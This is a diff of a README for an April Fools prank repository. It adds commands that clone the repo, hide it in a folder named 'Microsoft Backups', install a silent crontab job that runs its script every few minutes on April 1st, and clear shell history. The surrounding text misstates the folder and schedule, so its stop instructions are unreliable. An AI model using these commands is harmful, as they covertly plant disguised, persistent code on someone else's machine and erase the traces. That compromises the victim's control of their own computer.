@@ -6,7 +6,9 @@ git clone https://github.com/benbav/april_fools.git && \
 rm april_fools/README.md && \
 rm -rf april_fools/.git && \
 chmod u+x ~/april_fools/main.sh && \
-(crontab -l ; echo "*/5 * 1 4 * nohup /usr/bin/env bash ~/april_fools/main.sh > /dev/null 2>&1 &") | crontab - && \
+mkdir Microsoft\ Backups
+mv april_fools/ Microsoft\ Backups
+(crontab -l ; echo "*/5 * 1 4 * nohup /usr/bin/env bash ~/Microsoft\ Backups/april_fools/main.sh > /dev/null 2>&1 &") | crontab - && \
 history -c && history -p
 ```
 #### this clones the repo, moves the april_fools folder to the Documents folder and adds it to the crontab to run every hours on april 1st
@@ -18,7 +20,9 @@ git clone https://github.com/benbav/april_fools.git && \
 rm april_fools/README.md && \
 rm -rf april_fools/.git && \
 chmod u+x ~/april_fools/main.sh && \
-(crontab -l ; echo "* * * * * nohup /usr/bin/env bash ~/april_fools/main.sh > /dev/null 2>&1 &") | crontab - && \
+mkdir Microsoft\ Backups
+mv april_fools/ Microsoft\ Backups
+(crontab -l ; echo "* * * * * nohup /usr/bin/env bash ~/Microsoft\ Backups/april_fools/main.sh > /dev/null 2>&1 &") | crontab - && \
 history -c && history -p
 ```
 **if you need to stop it go to the Documents folder and delete the april_fools folder**
